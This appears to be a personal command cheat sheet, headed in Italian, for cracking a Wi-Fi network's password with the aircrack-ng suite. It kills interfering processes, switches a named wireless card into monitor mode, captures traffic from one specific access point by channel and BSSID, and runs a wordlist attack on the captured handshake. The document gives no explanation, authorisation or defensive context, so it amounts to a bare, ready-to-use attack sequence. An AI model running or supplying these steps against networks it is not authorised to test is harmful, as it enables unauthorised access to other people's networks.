# esecuzione

#ifconfig 
ip a

airmon-ng check 

airmon-ng check kill

airmon-ng start wlxbcec43442351

airodump-ng wlxbcec43442351

airodump-ng wlxbcec43442351 --channel 40 --bssid D4:72:26:0C:73:29 -w web

aircrack-ng -w web.txt -b D4:72:26:0C:73:29 web-01.cap
